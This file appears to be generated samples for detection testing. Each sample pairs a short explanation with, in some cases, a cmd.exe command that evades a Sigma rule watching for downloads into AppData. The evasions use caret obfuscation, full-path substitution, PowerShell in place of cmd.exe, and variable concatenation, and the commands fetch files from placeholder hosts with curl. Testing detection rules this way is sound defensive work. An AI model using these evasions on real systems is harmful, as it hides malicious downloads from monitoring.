explanation: Bypasses the rule by using the explicit path to the AppData directory (%USERPROFILE%\AppData\Roaming) instead of the %AppData% environment variable, circumventing the '%AppData%' string match condition.

Bypasses the rule by inserting CMD caret (^) escape characters into the target strings. The command interpreter ignores these characters during execution, but static SIEM string checks for 'http' and '%AppData%' will fail.
Bypasses the rule by using powershell.exe instead of cmd.exe to perform the download, as the Sigma rule's selection strictly looks for the process Image ending with '\cmd.exe'.

Bypasses the CommandLine string matching by using caret (^) obfuscation on 'http' and '%AppData%'. The Windows command processor ignores the carets during execution, but literal string detection rules will fail to match.
Bypasses the rule entirely because the rule's Image condition specifically looks for '\cmd.exe'. Executing the download directly via PowerShell evades this initial filter.

output: cmd.exe /c "set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%"
explanation: Bypasses the specific string checks by using environment variable concatenation and by specifying the absolute path to the Roaming AppData folder instead of using the monitored '%AppData%' variable.

The rule explicitly looks for the literal string '%AppData%'. By using '%USERPROFILE%\AppData\Roaming', the command resolves to the exact same directory while completely evading the '%AppData%' string match condition.

The Windows command shell interprets the caret symbol (^) as an escape character. The raw process creation logs will capture the command line containing the carets, breaking the contiguous 'http' and '://' substring matches required by the rule.

The detection logic is strictly bound to the execution of '\cmd.exe' in the Image condition. By performing the download and file drop directly using PowerShell without a cmd.exe wrapper, the Image condition is bypassed entirely.

By launching cmd.exe with delayed environment variable expansion enabled (/V:ON), the attacker can reference the AppData path using exclamation marks ('!AppData!') instead of percent signs, bypassing the explicit '%AppData%' string match.
Bypasses the rule by using the absolute path to the AppData directory rather than the literal environment variable string '%AppData%', evading the specific 'contains' string match.

output: cmd.exe /c "set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt"
explanation: Bypasses the rule by using caret escaping on 'http' (h^ttp) and manually concatenating environment variables to build the AppData string, breaking the 'contains|all' logic.
